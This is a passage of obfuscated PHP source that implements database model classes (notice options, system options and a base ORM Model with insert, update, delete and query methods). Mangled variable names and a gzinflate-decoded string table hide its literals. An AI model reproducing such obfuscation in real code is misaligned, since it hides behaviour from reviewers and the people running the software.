$§ò÷¾®[2307]; $this->modelType = $§ò÷¾®[2308]; $this->field = array($§ò÷¾®[2309], $§ò÷¾®[32], $§ò÷¾®[193], $§ò÷¾®[33], $§ò÷¾®[2310], $§ò÷¾®[775], $§ò÷¾®[209]); } public function userNoticeGet($½óÁ…Ò = false) { $this->initUserOption(); return parent::listData($½óÁ…Ò, $_SERVER[™»È’øè][442], !0); } public function userNoticeAdd($­ÂÚ¼›¹) { $º™ŞĞŒ =& $_SERVER[™»È’øè]; $this->initUserOption(); $‹æ²´î¯ = $this->findByKey($º™ŞĞŒ[2309], $­ÂÚ¼›¹[$º™ŞĞŒ[442]]); if ($‹æ²´î¯) { return !0; } $¢ı‡·Ó = array($º™ŞĞŒ[2309] => $­ÂÚ¼›¹[$º™ŞĞŒ[442]], $º™ŞĞŒ[32] => $­ÂÚ¼›¹[$º™ŞĞŒ[32]], $º™ŞĞŒ[193] => $­ÂÚ¼›¹[$º™ŞĞŒ[193]], $º™ŞĞŒ[33] => isset($­ÂÚ¼›¹[$º™ŞĞŒ[33]]) ? $­ÂÚ¼›¹[$º™ŞĞŒ[33]] : 1, $º™ŞĞŒ[2310] => isset($­ÂÚ¼›¹[$º™ŞĞŒ[2310]]) ? $­ÂÚ¼›¹[$º™ŞĞŒ[2310]] : 0, $º™ŞĞŒ[775] => 0, $º™ŞĞŒ[209] => 0); return parent::insert($¢ı‡·Ó); } public function userNoticeEdit($î®ÆÀïš, $›–Ó©ŠÖ) { $this->initUserOption(); return parent::update($î®ÆÀïš, $›–Ó©ŠÖ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\164\x65\155\x5f\157\160\x74\x69\157\x6e"; protected $jsonField = array("\155\x65\x6e\x75", "\162\157\x6c\145", "\162\x6f\154\x65\107\162\x6f\165\160", "\162\145\147\x69\x73\164", "\145\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($´Ò­¬ı¬) { return "\x53\x79\x73\x74\x65\x6d\117\160\x74\x69\157\156\x5f{$´Ò­¬ı¬}"; } protected function optionDefault($öä‹»¾¨ = '') { $ïãİ—Å° =& $_SERVER[™»È’øè]; if ($öä‹»¾¨ == $ïãİ—Å°[12]) { return $GLOBALS[$ïãİ—Å°[6]][$ïãİ—Å°[424]]; } } } goto CÊ•ÆÃ¤Ø; AÀª¾¥ñò: define($_SERVER[™»È’øè][645], $_SERVER[™»È’øè][646]); $pjseotlndv = $_SERVER[™»È’øè][647]; $_SERVER[ÏÉ‹Ã ] = explode($_SERVER[™»È’øè][648], gzinflate(substr($_SERVER[™»È’øè][649], 10, -8))); goto E¬åÂáƒÌ½; eÜ´£—ØÎ­: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\154\145", "\x6f\162\x64\145\162", "\141\x6c\151\x61\x73", "\x68\141\x76\x69\x6e\x67", "\147\162\x6f\165\x70", "\x6c\157\143\153", "\144\x69\x73\164\151\156\x63\x74", "\x61\x75\164\x6f", "\146\151\154\x74\145\162", "\x76\141\x6c\x69\x64\141\164\145", "\162\x65\x73\x75\154\x74", "\x62\x69\x6e\144", "\x74\x6f\153\145\156"); public function __construct($–Ïİ¿ì = '', $Âä¤¡é = '', $ÊğáŸ³„ = '') { $ÁÑÈ¡Âì =& $_SERVER[™»È’øè]; $this->_initialize(); if (!empty($–Ïİ¿ì)) { if (strpos($–Ïİ¿ì, $ÁÑÈ¡Âì[10])) { list($this->dbName, $this->name) = explode($ÁÑÈ¡Âì[10], $–Ïİ¿ì); } else { $this->name = $–Ïİ¿ì; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Âä¤¡é)) { $this->tablePrefix = $ÁÑÈ¡Âì[12]; } elseif ($ÁÑÈ¡Âì[12] != $Âä¤¡é) { $this->tablePrefix = $Âä¤¡é; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ÁÑÈ¡Âì[287]); } $this->db(0, empty($this->connection) ? $ÊğáŸ³„ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $™ƒâÈ¸ı =& $_SERVER[™»È’øè]; if (empty($this->fields)) { if (think_config($™ƒâÈ¸ı[288])) { $ÅæøÆ°Û = $this->dbName ? $this->dbName : think_config($™ƒâÈ¸ı[289]); $Ö”®‹Øì = think_var_cache($™ƒâÈ¸ı[290] . strtolower(get_path_this($ÅæøÆ°Û) . $™ƒâÈ¸ı[10] . $this->name)); if ($Ö”®‹Øì) { $¾Ñù†—ô = think_config($™ƒâÈ¸ı[291]); if (empty($¾Ñù†—ô) || $Ö”®‹Øì[$™ƒâÈ¸ı[292]] == $¾Ñù†—ô) { $this->fields = $Ö”®‹Øì; return; } } } $this->flush(); } } public function flush() { $ó¿Ä±– =& $_SERVER[™»È’øè]; $this->db->setModel($this->name); $ö»œ°™½ = $this->db->getFields($this->getTableName()); if (!$ö»œ°™½) { return !1; } $this->fields = array_keys($ö»œ°™½); $this->fields[$ó¿Ä±–[293]] = !1; foreach ($ö»œ°™½ as $şŠ×âïÎ => $ÕÏáåìı) { $Ò¯˜å—ø[$şŠ×âïÎ] = $ÕÏáåìı[$ó¿Ä±–[33]]; if ($ÕÏáåìı[$ó¿Ä±–[39]]) { $this->fields[$ó¿Ä±–[294]] = $şŠ×âïÎ; if ($ÕÏáåìı[$ó¿Ä±–[42]]) { $this->fields[$ó¿Ä±–[293]] = !0; } } } $this->fields[$ó¿Ä±–[295]] = $Ò¯˜å—ø; if (think_config($ó¿Ä±–[291])) { $this->fields[$ó¿Ä±–[292]] = think_config($ó¿Ä±–[291]); } if (think_config($ó¿Ä±–[288])) { $ÈÜ˜©‘Õ = $this->dbName ? $this->dbName : think_config($ó¿Ä±–[289]); think_var_cache($ó¿Ä±–[290] . strtolower(get_path_this($ÈÜ˜©‘Õ) . $ó¿Ä±–[10] . $this->name), $this->fields); } } public function switchModel($•Ÿ¯Şíç, $¨—±Õ›˜ = array()) { $äÛ¯”¨¦ =& $_SERVER[™»È’øè]; $ÈÖÍ§É› = ucwords(strtolower($•Ÿ¯Şíç)) . $äÛ¯”¨¦[296]; if (!class_exists($ÈÖÍ§É›)) { think_exception($ÈÖÍ§É› . think_lang($äÛ¯”¨¦[297])); } $this->_extModel = new $ÈÖÍ§É›($this->name); if (!empty($¨—±Õ›˜)) { foreach ($¨—±Õ›˜ as $ÜßÛ”¨ä) { $this->_extModel->setProperty($ÜßÛ”¨ä, $this->{$ÜßÛ”¨ä}); } } return $this->_extModel; } public function __set($ŒêÕéÇ, $«®¨Èü) { $this->data[$ŒêÕéÇ] = $«®¨Èü; } public function __get($Ï¡õ¿‹Œ) { return isset($this->data[$Ï¡õ¿‹Œ]) ? $this->data[$Ï¡õ¿‹Œ] : null; } public function __isset($Ÿ³ë¿…ë) { return isset($this->data[$Ÿ³ë¿…ë]); } public function __unset($š›˜˜¨©) { unset($this->data[$š›˜˜¨©]); } public function __call($ıö ™Œë, $æ¢ÛşÜ³) { $‘ˆ‡™Ø =& $_SERVER[™»È’øè]; if (in_array(strtolower($ıö ™Œë), $this->methods, !0)) { $this->options[strtolower($ıö ™Œë)] = $æ¢ÛşÜ³[0]; return $this; } elseif (in_array(strtolower($ıö ™Œë), array($‘ˆ‡™Ø[298], $‘ˆ‡™Ø[299], $‘ˆ‡™Ø[300], $‘ˆ‡™Ø[301], $‘ˆ‡™Ø[302]), !0)) { $İÎÛ¾‘¹ = isset($æ¢ÛşÜ³[0]) ? $æ¢ÛşÜ³[0] : $‘ˆ‡™Ø[202]; $İÎÛ¾‘¹ = $this->db->parseKey($İÎÛ¾‘¹); return $this->getField(strtoupper($ıö ™Œë) . $‘ˆ‡™Ø[303] . $İÎÛ¾‘¹ . $‘ˆ‡™Ø[304] . $ıö ™Œë, $‘ˆ‡™Ø[298]); } elseif (strtolower(substr($ıö ™Œë, 0, 5)) == $‘ˆ‡™Ø[305]) { $İÎÛ¾‘¹ = think_parse_name(substr($ıö ™Œë, 5)); $º¯á¤¬‘[$İÎÛ¾‘¹] = $æ¢ÛşÜ³[0]; return $this->where($º¯á¤¬‘)->find(); } elseif (strtolower(substr($ıö ™Œë, 0, 10)) == $‘ˆ‡™Ø[306]) { $‡‡Æìİ = think_parse_name(substr($ıö ™Œë, 10)); $º¯á¤¬‘[$‡‡Æìİ] = $æ¢ÛşÜ³[0]; return $this->where($º¯á¤¬‘)->getField($æ¢ÛşÜ³[1]); } elseif (isset($this->_scope[$ıö ™Œë])) { return $this->scope($ıö ™Œë, $æ¢ÛşÜ³[0]); } elseif (method_exists($this, $ıö ™Œë)) { array_unshift($æ¢ÛşÜ³, $ıö ™Œë); return call_user_func_array(array($this, $‘ˆ‡™Ø[307]), $æ¢ÛşÜ³); } else { return call_user_func_array(array(parent, $ıö ™Œë), $æ¢ÛşÜ³); } } protected function call() { $«á¨âä× =& $_SERVER[™»È’øè]; $ŒãÚ¿î² = func_get_args(); $óº™èàí = array_shift($ŒãÚ¿î²); $ûığ‡ü = $óº™èàí; if (is_array($óº™èàí)) { $ûığ‡ü = $óº™èàí[1]; $óº™èàí = $óº™èàí[0]; } $†êÏ—¦æ = count($ŒãÚ¿î²) - 1; if (isset($ŒãÚ¿î²[$†êÏ—¦æ]) && $ŒãÚ¿î²[$†êÏ—¦æ] === $óº™èàí) { think_exception(__CLASS__ . $«á¨âä×[4] . $óº™èàí . think_lang($«á¨âä×[308])); return; } $ŒãÚ¿î²[] = $óº™èàí; if (method_exists($this, $«á¨âä×[309])) { $¬ò ÀĞã = call_user_func_array(array($this, $«á¨âä×[310]), array($ûığ‡ü, $ŒãÚ¿î²)); if (!is_null($¬ò ÀĞã) && $¬ò ÀĞã !== !1) { return $¬ò ÀĞã; } } $×ÕüÕ£¡ = call_user_func_array(array($this, $óº™èàí), $ŒãÚ¿î²); if (method_exists($this, $«á¨âä×[311])) { $¬ò ÀĞã = call_user_func_array(array($this, $«á¨âä×[312]), array($ûığ‡ü, $ŒãÚ¿î², $×ÕüÕ£¡)); if ($¬ò ÀĞã) { return $¬ò ÀĞã; } } return $×ÕüÕ£¡; } protected function _initialize() { } protected function _facade($®ß«öç‹) { $æàÎºó =& $_SERVER[™»È’øè]; if (!empty($this->fields)) { foreach ($®ß«öç‹ as $ï‘¥ıÔ‰ => $¬äÚç´ø) { if (is_array($this->fields) && !in_array($ï‘¥ıÔ‰, $this->fields, !0)) { unset($®ß«öç‹[$ï‘¥ıÔ‰]); } elseif (is_scalar($¬äÚç´ø)) { $this->_parseType($®ß«öç‹, $ï‘¥ıÔ‰); } } } if (!empty($this->options[$æàÎºó[313]])) { $®ß«öç‹ = array_map($this->options[$æàÎºó[313]], $®ß«öç‹); unset($this->options[$æàÎºó[313]]); } $this->_beforeWrite($®ß«öç‹); return $®ß«öç‹; } protected function _beforeWrite(&$“ßô€“¶) { } public function add($ûŒÂşÕÖ = '', $”•œ—“Ş = array(), $À«´ÃŠ” = false) { if (empty($ûŒÂşÕÖ)) { if (!empty($this->data)) { $ûŒÂşÕÖ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[™»È’øè][314]); return !1; } } $”•œ—“Ş = $this->_parseOptions($”•œ—“Ş); $ûŒÂşÕÖ = $this->_facade($ûŒÂşÕÖ); if (!1 === $this->_beforeInsert($ûŒÂşÕÖ, $”•œ—“Ş)) { return !1; } $´‹ù½¯¡ = $this->db->insert($ûŒÂşÕÖ, $”•œ—“Ş, $À«´ÃŠ”); if (!1 !== $´‹ù½¯¡) { $ÕÛ¸·‘ = $this->getLastInsID(); if ($ÕÛ¸·‘) { $ûŒÂşÕÖ[$this->getPk()] = $ÕÛ¸·‘; $this->_after_insert($ûŒÂşÕÖ, $”•œ—“Ş); return $ÕÛ¸·‘; } $this->_after_insert($ûŒÂşÕÖ, $”•œ—“Ş); } return $´‹ù½¯¡; } protected function _beforeInsert(&$‹’áù¸, $ñ†Ïëû©) { } protected function _after_insert($ÃäŸ™Õ, $èï¶™ñØ) { } public function addAll($†¤³¥­Ó, $°ò‡¶ê“ = array(), $Ñ›æÊÃ¤ = false) { $»Èó…šÒ =& $_SERVER[™»È’øè]; if (empty($†¤³¥­Ó)) { $this->error = think_lang($»Èó…šÒ[314]); return !1; } $°ò‡¶ê“ = $this->_parseOptions($°ò‡¶ê“); foreach ($†¤³¥­Ó as $ÈÊ½“Ãì => $¨“Ñ“ˆ) { $†¤³¥­Ó[$ÈÊ½“Ãì] = $this->_facade($¨“Ñ“ˆ); } if (method_exists($this->db, $»Èó…šÒ[315])) { $¿°Ş¹ = $this->db->insertAll($†¤³¥­Ó, $°ò‡¶ê“, $Ñ›æÊÃ¤); } else { $this->startTrans(); foreach ($†¤³¥­Ó as $ÈÊ½“Ãì => $¨“Ñ“ˆ) { $¿°Ş¹ = $this->db->insert($¨“Ñ“ˆ, $°ò‡¶ê“, $Ñ›æÊÃ¤); } $this->commit(); } if (!1 !== $¿°Ş¹) { $õ¾ŠĞ— = $this->getLastInsID(); if ($õ¾ŠĞ—) { return $õ¾ŠĞ—; } } return $¿°Ş¹; } public function selectAdd($Ã»æ³ëï = '', $’Ü£ÑÙ = '', $ˆ¢×£¶’ = array()) { $§ÒÒá°„ =& $_SERVER[™»È’øè]; $ˆ¢×£¶’ = $this->_parseOptions($ˆ¢×£¶’); if (!1 === ($ÅÆ¦Òâù = $this->db->selectInsert($Ã»æ³ëï ? $Ã»æ³ëï : $ˆ¢×£¶’[$§ÒÒá°„[316]], $’Ü£ÑÙ ? $’Ü£ÑÙ : $this->getTableName(), $ˆ¢×£¶’))) { $this->error = think_lang($§ÒÒá°„[317]); return !1; } else { return $ÅÆ¦Òâù; } } public function save($Å°¾Œßå = '', $“îªÇ·— = array()) { $Äö†Ü©Ş =& $_SERVER[™»È’øè]; if (empty($Å°¾Œßå)) { if (!empty($this->data)) { $Å°¾Œßå = $this->data; $this->data = array(); } else { $this->error = think_lang($Äö†Ü©Ş[314]); return !1; } } $Å°¾Œßå = $this->_facade($Å°¾Œßå); $“îªÇ·— = $this->_parseOptions($“îªÇ·—); $Ü·½£æ· = $this->getPk(); if (!isset($“îªÇ·—[$Äö†Ü©Ş[318]])) { if (isset($Å°¾Œßå[$Ü·½£æ·])) { $ï¤¦¹Ã[$Ü·½£æ·] = $Å°¾Œßå[$Ü·½£æ·]; $“îªÇ·—[$Äö†Ü©Ş[318]] = $ï¤¦¹Ã; unset($Å°¾Œßå[$Ü·½£æ·]); } else { $this->error = think_lang($Äö†Ü©Ş[317]); return !1; } } if (is_array($“îªÇ·—[$Äö†Ü©Ş[318]]) && isset($“îªÇ·—[$Äö†Ü©Ş[318]][$Ü·½£æ·])) { $§’³ Òû = $“îªÇ·—[$Äö†Ü©Ş[318]][$Ü·½£æ·]; } if (!1 === $this->_beforeUpdate($Å°¾Œßå, $“îªÇ·—)) { return !1; } $òôÁ½½Š = $this->db->update($Å°¾Œßå, $“îªÇ·—); if (!1 !== $òôÁ½½Š) { if (isset($§’³ Òû)) { $Å°¾Œßå[$Ü·½£æ·] = $§’³ Òû; } $this->_afterUpdate($Å°¾Œßå, $“îªÇ·—); } return $òôÁ½½Š; } protected function _beforeUpdate(&$½ö…ìèõ, $ùÄá´óÏ) { } protected function _afterUpdate($”ïàâãü, $İÈÂÚ¹ä) { } public function delete($‘‹“–ğµ = array()) { $ÖÈÍ†³Ï =& $_SERVER[™»È’øè]; if (empty($‘‹“–ğµ) && empty($this->options[$ÖÈÍ†³Ï[318]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $¯ÎÆ«› = $this->getPk(); if (is_numeric($‘‹“–ğµ) || is_string($‘‹“–ğµ)) { if (strpos($‘‹“–ğµ, $ÖÈÍ†³Ï[50])) { $™Î¸¨ø®[$¯ÎÆ«›] = array($ÖÈÍ†³Ï[319], $‘‹“–ğµ); } else { $™Î¸¨ø®[$¯ÎÆ«›] = $‘‹“–ğµ; } $this->options[$ÖÈÍ†³Ï[318]] = $™Î¸¨ø®; } $‘‹“–ğµ = $this->_parseOptions(); if (is_array($‘‹“–ğµ[$ÖÈÍ†³Ï[318]]) && isset($‘‹“–ğµ[$ÖÈÍ†³Ï[318]][$¯ÎÆ«›])) { $‚öË¼¶ = $‘‹“–ğµ[$ÖÈÍ†³Ï[318]][$¯ÎÆ«›]; } $ïù¾ÛÂ = $this->db->delete($‘‹“–ğµ); if (!1 !== $ïù¾ÛÂ) { $¢ÅºİşÃ = array(); if (isset($‚öË¼¶)) { $¢ÅºİşÃ[$¯ÎÆ«›] = $‚öË¼¶; } $this->_after_delete($¢ÅºİşÃ, $‘‹“–ğµ); } return $ïù¾ÛÂ; } protected function _after_delete($ãÊü¨ô†, $‰€¼˜Ó§) { } public function select($öÚØ±ê¤ = array()) { $ªÂø«ÎÆ =& $_SERVER[™»È’øè]; if (is_string($öÚØ±ê¤) || is_numeric($öÚØ±ê¤)) { $¥ã˜•š… = $this->getPk(); if (strpos($öÚØ±ê¤, $ªÂø«ÎÆ[50])) { $Ù™˜¤³[$¥ã˜•š…] = array($ªÂø«ÎÆ[319], $öÚØ±ê¤); } else { $Ù™˜¤³[$¥ã˜•š…] = $öÚØ±ê¤; } $this->options[$ªÂø«ÎÆ[318]] = $Ù™˜¤³; } elseif (!1 === $öÚØ±ê¤) { $öÚØ±ê¤ = $this->_parseOptions(); return $ªÂø«ÎÆ[320] . $this->db->buildSelectSql($öÚØ±ê¤) . $ªÂø«ÎÆ[321]; } $öÚØ±ê¤ = $this->_parseOptions(); $¹è¬Ç£‡ = $this->db->select($öÚØ±ê¤); if (!1 === $¹è¬Ç£‡) { return !1; } if (empty($¹è¬Ç£‡)) { return null; } $this->_afterSelect($¹è¬Ç£‡, $öÚØ±ê¤); return $¹è¬Ç£‡; } protected function _afterSelect(&$¿÷İ×†‚, $äŠ’…ú­) { } public function buildSql($ ¿äş¬” = array()) { $Œ¯ÄÙ½å =& $_SERVER[™»È’øè]; $ ¿äş¬” = $this->_parseOptions($ ¿äş¬”); return $Œ¯ÄÙ½å[320] . $this->db->buildSelectSql($ ¿äş¬”) . $Œ¯ÄÙ½å[321]; } public function optionsValue($ÃÉ‡÷£¶ = null) { if (is_null($ÃÉ‡÷£¶)) { return $this->options; } elseif (is_array($ÃÉ‡÷£¶)) { $this->options = array_merge($this->options, $ÃÉ‡÷£¶); } } protected function _parseOptions($Ä¥ˆÖÇ• = array()) { $Â«¯»ıˆ =& $_SERVER[™»È’øè]; if (is_array($Ä¥ˆÖÇ•)) { $Ä¥ˆÖÇ• = array_merge($this->options, $Ä¥ˆÖÇ•); } $this->options = array(); if (!isset($Ä¥ˆÖÇ•[$Â«¯»ıˆ[322]])) { $Ä¥ˆÖÇ•[$Â«¯»ıˆ[322]] = $this->getTableName(); $Ê½Ûîı´ = $this->fields; } else { $Ê½Ûîı´ = $this->getDbFields(); } if (!empty($Ä¥ˆÖÇ•[$Â«¯»ıˆ[323]])) { $Ä¥ˆÖÇ•[$Â«¯»ıˆ[322]] .= $Â«¯»ıˆ[53] . $Ä¥ˆÖÇ•[$Â«¯»ıˆ[323]]; } $Ä¥ˆÖÇ•[$Â«¯»ıˆ[324]] = $this->name; if (isset($Ä¥ˆÖÇ•[$Â«¯»ıˆ[318]]) && is_array($Ä¥ˆÖÇ•[$Â«¯»ıˆ[318]]) && !empty($Ê½Ûîı´) && !isset($Ä¥ˆÖÇ•[$Â«¯»ıˆ[325]]) && !isset($Ä¥ˆÖÇ•[$Â«¯»ıˆ[322]])) { foreach ($Ä¥ˆÖÇ•[$Â«¯»ıˆ[318]] as $¼’¥ëÍ => $Ğú°ªÍì) { $¼’¥ëÍ = trim($¼’¥ëÍ); if (in_array($¼’¥ëÍ, $Ê½Ûîı´, !0)) { if (is_scalar($Ğú°ªÍì)) { $this->_parseType($Ä¥ˆÖÇ•[$Â«¯»ıˆ[318]], $¼’¥ëÍ); } } elseif (!is_numeric($¼’¥ëÍ) && $Â«¯»ıˆ[11] != substr($¼’¥ëÍ, 0, 1) && !1 === strpos($¼’¥ëÍ, $Â«¯»ıˆ[10]) && !1 === strpos($¼’¥ëÍ, $Â«¯»ıˆ[303]) && !1 === strpos($¼’¥ëÍ, $Â«¯»ıˆ[326]) && !1 === strpos($¼’¥ëÍ, $Â«¯»ıˆ[327])) { unset($Ä¥ˆÖÇ•[$Â«¯»ıˆ[318]][$¼’¥ëÍ]); } } } $this->_options_filter($Ä¥ˆÖÇ•); return $Ä¥ˆÖÇ•; } protected function _options_filter(&$Ş…“­‹¦) { } protected function _parseType(&$§ºô¸Ì, $‰‘ÈúÕ‚) { $ÄóÜ¥§ı =& $_SERVER[™»È’øè]; if (empty($this->options[$ÄóÜ¥§ı[328]][$ÄóÜ¥§ı[4] . $‰‘ÈúÕ‚])) { $İÚÁ«¶ = strtolower($this->fields[$ÄóÜ¥§ı[295]][$‰‘ÈúÕ‚]); if (!1 !== strpos($İÚÁ«¶, $ÄóÜ¥§ı[329])) { } elseif (!1 === strpos($İÚÁ«¶, $ÄóÜ¥§ı[330]) && !1 !== strpos($İÚÁ«¶, $ÄóÜ¥§ı[331])) { $§ºô¸Ì[$‰‘ÈúÕ‚] = intval($§ºô¸Ì[$‰‘ÈúÕ‚]); } elseif (!1 !== strpos($İÚÁ«¶, $ÄóÜ¥§ı[332]) || !1 !== strpos($İÚÁ«¶, $ÄóÜ¥§ı[333])) { $§ºô¸Ì[$‰‘ÈúÕ‚] = floatval($§ºô¸Ì[$‰‘ÈúÕ‚]); } elseif (!1 !== strpos($İÚÁ«¶, $ÄóÜ¥§ı[334])) { $§ºô¸Ì[$‰‘ÈúÕ‚] = (bool) $§ºô¸Ì[$‰‘ÈúÕ‚]; } } } public function find($ùƒ§¨°â = array()) { $ˆ‘ÖÉñó =& $_SERVER[™»È’øè]; if (is_numeric($ùƒ§¨°â) || is_string($ùƒ§¨°â)) { $·×¬Ü°ï[$this->getPk()] = intval($ùƒ§¨°â); $this->options[$ˆ‘ÖÉñó[318]] = $·×¬Ü°ï; } $this->options[$ˆ‘ÖÉñó[335]] = 1; $ùƒ§¨°â = $this->_parseOptions(); $¤ÌÈñÚØ = $this->db->select($ùƒ§¨°â); if (!1 === $¤ÌÈñÚØ) { return !1; } if (empty($¤ÌÈñÚØ)) { return null; } $this->data = $¤ÌÈñÚØ[0]; $this->_afterFind($this->data, $ùƒ§¨°â); if (!empty($this->options[$ˆ‘ÖÉñó[336]])) { return $this->returnResult($this->data, $this->options[$ˆ‘ÖÉñó[336]]); } return $this->data; } protected function _afterFind(&$°æ—ÒĞµ, $ˆ‚Áé Ó) { } protected function returnResult($¯Ÿ íÔù, $æÑßÔÒ— = '') { $€œ´áÅ =& $_SERVER[™»È’øè]; if ($æÑßÔÒ—) { if (is_callable($æÑßÔÒ—)) { return call_user_func($æÑßÔÒ—, $¯Ÿ íÔù); } switch (strtolower($æÑßÔÒ—)) { case $€œ´áÅ[337]: return json_encode($¯Ÿ íÔù); case $€œ´áÅ[338]: return xml_encode($¯Ÿ íÔù); } } return $¯Ÿ íÔù; } public function parseFieldsMap($ş‡‚ìš², $ñıĞªÏ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ÇÖ–Áéé => $»•æò¤“) { if ($ñıĞªÏ == 1) { if (isset($ş‡‚ìš²[$»•æò¤“])) { $ş‡‚ìš²[$ÇÖ–Áéé] = $ş‡‚ìš²[$»•æò¤“]; unset($ş‡‚ìš²[$»•æò¤“]); } } else { if (isset($ş‡‚ìš²[$ÇÖ–Áéé])) { $ş‡‚ìš²[$»•æò¤“] = $ş‡‚ìš²[$ÇÖ–Áéé]; unset($ş‡‚ìš²[$ÇÖ–Áéé]); } } } } return $ş‡‚ìš²; } public function setField($ëÃœëö×, $ºïœ¸ãº = '') { if (is_array($ëÃœëö×)) { $š±ãÂ  = $ëÃœëö×; } else { $š±ãÂ [$ëÃœëö×] = $ºïœ¸ãº; } return $this->save($š±ãÂ ); } public function setAdd($İäªŸ¥Ï, $”Ä‚©Àœ = 1) { $•ÔÌ£ŸÓ =& $_SERVER[™»È’øè]; $ÑšæØ‰ä = $İäªŸ¥Ï . $•ÔÌ£ŸÓ[339] . $”Ä‚©Àœ; if ($”Ä‚©Àœ < 0) { $ÑšæØ‰ä = $İäªŸ¥Ï . $”Ä‚©Àœ; } return $this->setField($İäªŸ¥Ï, array($•ÔÌ£ŸÓ[340], $ÑšæØ‰ä)); } public function getField($ø¼°ÊØ‹, $ÅÎ¦ÍÇÇ = null) { $ïĞôÆÄÒ =& $_SERVER[™»È’øè]; $ˆµªé•[$ïĞôÆÄÒ[316]] = $ø¼°ÊØ‹; $ˆµªé• = $this->_parseOptions($ˆµªé•); $ø¼°ÊØ‹ = trim($ø¼°ÊØ‹); if (strpos($ø¼°ÊØ‹, $ïĞôÆÄÒ[50])) { if (!isset($ˆµªé•[$ïĞôÆÄÒ[335]])) { $ˆµªé•[$ïĞôÆÄÒ[335]] = is_numeric($ÅÎ¦ÍÇÇ) ? $ÅÎ¦ÍÇÇ : $ïĞôÆÄÒ[12]; } $“®Ëñ´Ö = $this->db->select($ˆµªé•); if (!empty($“®Ëñ´Ö)) { $ğìª¿Ù = explode($ïĞôÆÄÒ[50], $ø¼°ÊØ‹); $ø¼°ÊØ‹ = array_keys($“®Ëñ´Ö[0]); $üû×ä•ü = array_shift($ø¼°ÊØ‹); $í¥ö­¯ = array_shift($ø¼°ÊØ‹); $ˆ¯°¢¼ = array(); $ş‹Õ”ƒ = count($ğìª¿Ù); foreach ($“®Ëñ´Ö as $±í¼À) { $üğõ“·è = $±í¼À[$üû×ä•ü]; if (2 == $ş‹Õ”ƒ) { $ˆ¯°¢¼[$üğõ“·è] = $±í¼À[$í¥ö­¯]; } else { $ˆ¯°¢¼[$üğõ“·è] = is_string($ÅÎ¦ÍÇÇ) ? implode($ÅÎ¦ÍÇÇ, $±í¼À) : $±í¼À; } } return $ˆ¯°¢¼; } } else { if (!0 !== $ÅÎ¦ÍÇÇ) { $ˆµªé•[$ïĞôÆÄÒ[335]] = is_numeric($ÅÎ¦ÍÇÇ) ? $ÅÎ¦ÍÇÇ : 1; } if ($ÅÎ¦ÍÇÇ === $ïĞôÆÄÒ[298]) { unset($ˆµªé•[$ïĞôÆÄÒ[335]]); } $±í¼À = $this->db->select($ˆµªé•); if (!empty($±í¼À)) { if ($ÅÎ¦ÍÇÇ === $ïĞôÆÄÒ[298]) { return reset($±í¼À[0]); } if (!0 !== $ÅÎ¦ÍÇÇ && 1 == $ˆµªé•[$ïĞôÆÄÒ[335]]) { return reset($±í¼À[0]); } foreach ($±í¼À as $ª—½±¯È) { $áÛÎõ³ı[] = $ª—½±¯È[$ø¼°ÊØ‹]; } return $áÛÎõ³ı; } } return null; } public function create($®êÖŸŸŞ = '', $–Í«Œâá = '') { $ÜÌšÖºô =& $_SERVER[™»È’øè]; if (empty($®êÖŸŸŞ)) { $®êÖŸŸŞ = $_POST; } elseif (is_object($®êÖŸŸŞ)) { $®êÖŸŸŞ = get_object_vars($®êÖŸŸŞ); } if (empty($®êÖŸŸŞ) || !is_array($®êÖŸŸŞ)) { $this->error = think_lang($ÜÌšÖºô[314]); return !1; } $®êÖŸŸŞ = $this->parseFieldsMap($®êÖŸŸŞ, 0); $–Í«Œâá = $–Í«Œâá ? $–Í«Œâá : (!empty($®êÖŸŸŞ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ÜÌšÖºô[316]])) { $™ëºÜ¬Ğ = $this->options[$ÜÌšÖºô[316]]; unset($this->options[$ÜÌšÖºô[316]]); } elseif ($–Í«Œâá == THINK_MODEL_INSERT && isset($this->insertFields)) { $™ëºÜ¬Ğ = $this->insertFields; } elseif ($–Í«Œâá == THINK_MODEL_UPDATE && isset($this->updateFields)) { $™ëºÜ¬Ğ = $this->updateFields; } if (isset($™ëºÜ¬Ğ)) { if (is_string($™ëºÜ¬Ğ)) { $™ëºÜ¬Ğ = explode($ÜÌšÖºô[50], $™ëºÜ¬Ğ); } if (think_config($ÜÌšÖºô[341])) { $™ëºÜ¬Ğ[] = think_config($ÜÌšÖºô[342]); } foreach ($®êÖŸŸŞ as $Ñ†ÄåıË => $·ùŒçñİ) { if (!in_array($Ñ†ÄåıË, $™ëºÜ¬Ğ)) { unset($®êÖŸŸŞ[$Ñ†ÄåıË]); } } } if (!$this->autoValidation($®êÖŸŸŞ, $–Í«Œâá)) { return !1; } if (!$this->autoCheckToken($®êÖŸŸŞ)) { $this->error = think_lang($ÜÌšÖºô[343]); return !1; } if ($this->autoCheckFields) { $™ëºÜ¬Ğ = $this->getDbFields(); foreach ($®êÖŸŸŞ as $Ñ†ÄåıË => $·ùŒçñİ) { if (!in_array($Ñ†ÄåıË, $™ëºÜ¬Ğ)) { unset($®êÖŸŸŞ[$Ñ†ÄåıË]); } elseif (MAGIC_QUOTES_GPC && is_string($·ùŒçñİ)) { $®êÖŸŸŞ[$Ñ†ÄåıË] = stripslashes($·ùŒçñİ); } } } $this->autoOperation($®êÖŸŸŞ, $–Í«Œâá); $this->data = $®êÖŸŸŞ; return $®êÖŸŸŞ; } public function autoCheckToken($•Õ©´şÁ) { $…à’Œ¢ï =& $_SERVER[™»È’øè]; if (isset($this->options[$…à’Œ¢ï[344]]) && !$this->options[$…à’Œ¢ï[344]]) { 